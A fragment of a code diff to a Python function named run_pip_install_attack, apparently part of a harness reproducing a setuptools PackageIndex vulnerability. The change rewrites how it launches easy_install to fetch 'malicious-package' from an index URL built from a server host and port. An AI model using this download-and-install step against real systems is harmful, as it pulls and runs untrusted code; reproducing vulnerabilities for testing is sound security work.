@@ -88,12 +88,14 @@ def run_pip_install_attack(server_host, server_port, scenario_name):
 
     # Use easy_install which uses setuptools' vulnerable PackageIndex
     # The vulnerability triggers during the package resolution/download phase
+    easy_install_code = f'''
+import sys
+from setuptools.command.easy_install import main
+sys.argv = ["easy_install", "--index-url", "{index_url}", "malicious-package"]
+main()
+'''
     result = subprocess.run(
-        [
-            sys.executable, "-m", "easy_install",
-            "--index-url", index_url,
-            "malicious-package"
-        ],
+        [sys.executable, "-c", easy_install_code],
         capture_output=True,
         text=True,
         timeout=30
